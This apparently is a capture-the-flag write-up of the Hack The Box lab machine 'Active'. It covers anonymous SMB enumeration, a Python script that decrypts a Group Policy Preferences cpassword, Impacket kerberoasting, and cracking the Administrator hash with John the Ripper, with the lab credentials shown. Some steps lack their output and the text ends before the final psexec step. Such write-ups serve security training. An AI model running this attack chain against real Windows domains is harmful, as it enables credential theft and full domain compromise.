1. Enumeration

I started with port enumeration:

sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.10.100
  • -p- --open: Scans all ports and shows open ones.
  • -sS: SYN stealth scan.
  • -Pn: Disable ICMP Echo request.
  • --min-rate: How many packets should be sent simultaneously.
  • -n: disables DNS resolution.
  • -vvv: Maximum verbosity for real-time results.

I got a lot of ports open

I started by enumerating the smb shares anonymously.

smbclient -N -L \\\\10.10.10.100 Anonymous login successful Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk SMB1 disabled -- no workgroup available
  • -N : login anonymously.
  • -L : list the shares.

There I found some files under Replication share.

smbclient -N \\\\10.10.10.100\\Replication

The one that was more important for me it was the 'Groups.xml' file which was under here :

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups

Then I crafted this script to decode the password.

from Crypto.Cipher import AES import base64 # GPP AES key key = bytes.fromhex("4e9906e8fcb64f2ea3786f4d2b0d7b1b") # Exact cpassword value from XML cpassword = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" cpassword = cpassword.strip().replace('\n', '') # Sanitize cpassword += '=' * (-len(cpassword) % 4) # Fix padding # Decrypt decoded = base64.b64decode(cpassword) cipher = AES.new(key, AES.MODE_CBC, iv=b'\x00' * 16) decrypted_bytes = cipher.decrypt(decoded) try: decrypted = decrypted_bytes.decode("utf-16le").rstrip("\x00") print(f"Decrypted password: {decrypted}") except UnicodeDecodeError as e: print("[!] Failed to decode as UTF-16LE") print("Raw decrypted bytes:", decrypted_bytes)

3. Privilege Escalation

From enumeration I know it is a Windows machine and I have credentials for a user, I started kerberoasting.


I used the GetUserSPNs.py from Impacket's toolset :

GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100

I dumped a Service Principal Name (SPN) tied to administrator, which means I can roast the Administrator's TGS Kerberos service ticket .

active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 22:06:40.351723 2025-06-09 20:33:56.672571

I want to extract the Administrator's hash, and I use the '-request' flag.

GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request

Where I get this response :

I cracked the hash by using John The Ripper tool :

~/john/run$ ./john --wordlist=/usr/share/wordlists/rockyou.txt ~/admin.hash Ticketmaster1968

The next tool that I used was the psexec.py to get the SYSTEM shell :
